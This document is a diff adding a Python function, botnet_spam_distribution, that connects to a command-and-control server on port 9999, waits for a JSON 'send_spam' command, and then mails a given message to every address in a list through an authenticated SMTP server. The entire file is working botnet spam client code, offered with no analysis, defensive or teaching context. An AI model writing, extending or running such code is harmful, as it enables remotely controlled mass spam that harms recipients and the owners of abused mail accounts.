@@ -1,0 +1,34 @@
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import socket
+import json
+def botnet_spam_distribution(email_list: list, email_subject: str, email_body: str, smtp_server: str, smtp_port: int, email_user: str, email_pass: str, c2_server: str) -> None:
+
+    def connect_to_c2(c2_server):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((c2_server, 9999))
+        return sock
+
+    def receive_commands(sock):
+        data = sock.recv(4096).decode('utf-8')
+        commands = json.loads(data)
+        return commands
+
+    def send_email(to_email, subject, body, smtp_server, smtp_port, email_user, email_pass):
+        msg = MIMEMultipart()
+        msg['From'] = email_user
+        msg['To'] = to_email
+        msg['Subject'] = subject
+        msg.attach(MIMEText(body, 'plain'))
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(email_user, email_pass)
+        text = msg.as_string()
+        server.sendmail(email_user, to_email, text)
+        server.quit()
+    sock = connect_to_c2(c2_server)
+    commands = receive_commands(sock)
+    if commands.get('action') == 'send_spam':
+        for email in email_list:
+            send_email(email, email_subject, email_body, smtp_server, smtp_port, email_user, email_pass)
